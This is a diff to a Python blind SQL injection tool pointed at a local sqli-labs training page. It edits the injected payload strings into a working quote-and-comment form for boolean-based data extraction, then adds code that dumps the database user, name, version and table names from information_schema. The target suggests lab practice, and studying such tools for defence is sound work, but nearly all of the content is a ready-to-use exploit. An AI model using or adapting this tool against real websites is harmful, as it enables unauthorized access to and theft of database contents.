@@ -69,7 +69,6 @@ class Blind():
 
     
     def build_get_request(self, url, params):
-        print (self.url + '?' + urllib.urlencode(params))
         return urllib2.Request(self.url + '?' + urllib.urlencode(params),None,self.headers)
     
     def make_request(self, params):
@@ -81,28 +80,30 @@ class Blind():
         hdrs =  result.headers
         if 'Content-Encoding' in hdrs and hdrs['Content-Encoding'] == 'gzip':
             data = zlib.decompress(result,16+zlib.MAX_WBITS)
-        result = self.request_succcessful(data)
+        #print req.__dict__
+        result = self.request_successful(data)
         time.sleep(self.timeout)
         return result
     
     def request_successful(self, data):
         return self.good_string in data
 
+    #依据对应sql语句需修改payload
     def count_params(self, operator, number, table):
         params = dict(self.params)
-        params[self.vulnerable_param] += ' and {0} {1} （select count(*) from {2})'.format(number,operator,table)
+        params[self.vulnerable_param] += '\' and {0} {1} (select count(*) from {2}) -- '.format(number,operator,table)
         return params
 
     def length_params(self, operator,number, field, table, offset):
         params = dict(self.params)
         table = ' from ' + table if table is not None else ''
-        params[self.vulnerable_param] += ' and {0} {1} (select length({2}) {3} limit 1 offset {4})'.format(number, operator, field, table, offset)
+        params[self.vulnerable_param] += '\' and {0} {1} (select length({2}) {3} limit 1 offset {4}) -- '.format(number, operator, field, table, offset)
         return params
 
-    def data_params(self, operator, number, field, table,offset):
+    def data_params(self, number, field, str_index, table, offset):
         params = dict(self.params)
         table = ' from ' + table if table is not None else ''
-        params[self.vulnerable_param] += ' and {0} < (select ascii(substring({1}, {2}, 1)) {3} limit 1 offset {4}'.format(number, field, str_index, table, offset)
+        params[self.vulnerable_param] += '\' and {0} < (select ascii(substring({1}, {2}, 1)) {3} limit 1 offset {4} )-- '.format(number, field, str_index, table, offset)
         return params
 
     def echo_trying(self, string, number):
@@ -143,12 +144,11 @@ class Blind():
         while True:
             self.echo_trying('length',last)
             params =  self.length_params('>',last,field,table,index)
-            print (params)
             if self.make_request(params):
                 break
             last *= 2
         sys.stdout.write('\rAt most length '+ str(last))
-        sts.stdout.flush()
+        sys.stdout.flush()
         first =  last / 2
         while first < last:
             middle = (first + last) / 2
@@ -169,8 +169,8 @@ class Blind():
         print '\r[+] Guessed length: ' + str(length)
         output = ''
         for i in range(1,length+1):
-            first = ord(' ')
-            last = 126
+            first = 32#空格 第一个可打印自负
+            last = 126#最后一个可打印字符
             curSize = len(output)
             while curSize == len(output):
                 middle =  (first + last) / 2
@@ -222,7 +222,7 @@ class Blind():
                 where_cond.append(i)
         return ' '.join(where_cond)
 
-
+    #fields 表示要注入得到的数据
     def query(self, fields, table, where='', start=0):
         try:
             print '[+] Guessing number of rows...'
@@ -264,8 +264,11 @@ class Blind():
         print '[+] Username: ' + username
         print '[+] Database: ' + database
         print '[+] Version: ' + version
-
+        return (username,database,version)
 
 if __name__ == "__main__":
     test = Blind('http://localhost:8888/sqli-labs/less-8/?id=1','You are in...........')
-    test.proof_of_concept()
+    username,database,version=test.proof_of_concept()
+    print 'Get table'
+    where = 'table_schema=\''+database+'\''
+    table = test.query('table_name','information_schema.tables',where)
